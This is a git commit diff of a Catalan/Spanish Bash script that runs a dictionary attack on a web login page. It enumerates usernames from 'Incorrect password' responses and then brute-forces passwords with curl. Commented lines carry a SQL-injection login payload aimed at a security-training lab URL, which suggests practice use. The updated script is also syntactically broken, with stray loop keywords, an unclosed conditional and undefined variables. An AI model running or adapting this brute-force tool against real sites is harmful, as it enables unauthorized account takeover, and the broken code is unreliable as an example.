9f61ec7b7290473bd0a8b7cfb002d134638900d6
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-04-06 16:54:20 +0200

    Update diccionari01.sh

--- diccionari01.sh
+++ diccionari01.sh
@@ -1,32 +1,53 @@
 #!/bin/bash
-document=a.txt
+function ataque_diccionario() {
 start=1
-echo "Quina pagina web vols atacar? Recorda introduir exactament l'enllaç de la pàgina on es fa el login"
-read URL
-echo "Recorda que aquest procés pot trigar minuts."
+URL=$(echo -e "$url")
+echo "Digam un usuari o un fitxer txt d'usuaris"
+read document
+if [ -f  $document ]    
+then
+    echo "Recorda que aquest procés pot trigar minuts."
+    total=$(wc -l < $document)
+    while [[ $start -le $total ]]
+        do
+        test=$(awk "NR==$start{print $1}" $document)
+    #    curl -s -d "csrf=!284453q&username=administrator'--&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
+        if [[ $(curl -s -d "username=$test&password=a" $URL | grep "Incorrect password") ]]
+        then
+            echo -e "username is $test"
+            username=$test
+            break 1
+        fi
+        ((start = start + 1))
+    #    echo $start
+    done
+else
+    if [[ $(curl -s -d "username=$document&password=a" $URL | grep "Incorrect password") ]]
+        then
+            echo -e "username is $document"
+            username=$test
+            break 1
+        else
+            echo "username incorrecto"
+        fi
+        ((start = start + 1))
+    #    echo $start
+    done
+fi
+
+echo "Vols pasar un diccionari de contrasenyes o fem servir un diccionari ja existent?"
+read document
+if [ -f  $document ] 
+then
+    echo "Ficher valid"
+else
+    echo "El Fichero no es valid, usaremos"
+start=1
 total=$(wc -l < $document)
 while [[ $start -le $total ]]
     do
     test=$(awk "NR==$start{print $1}" $document)
-#    curl -s -d "csrf=!284453q&username=administrator'--&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
-    if [[ $(curl -s -d "username=$test&password=a" $URL | grep "Incorrect password") ]]
-    then
-        echo -e "username is $test"
-        username=$test
-        break 1
-    fi
-    ((start = start + 1))
-#    echo $start
-done
-
-
-document=b.txt
-start=1
-total=$(wc -l < $document)
-while [[ $start -le $total ]]
-    do
-    test=$(awk "NR==$start{print $1}" $document)
-#    curl -s -d "username=$test&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
+    #    curl -s -d "username=$test&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
     if ! [[ $(curl -s -d "username=$username&password=$test" $URL | grep "Incorrect password") ]]
     then
         echo -e "La contrasenya és $test"
@@ -35,4 +56,5 @@ while [[ $start -le $total ]]
     fi
     ((start = start + 1))
 done
-
+echo -e "Usuari es $usuari y usuari es $password"
+}
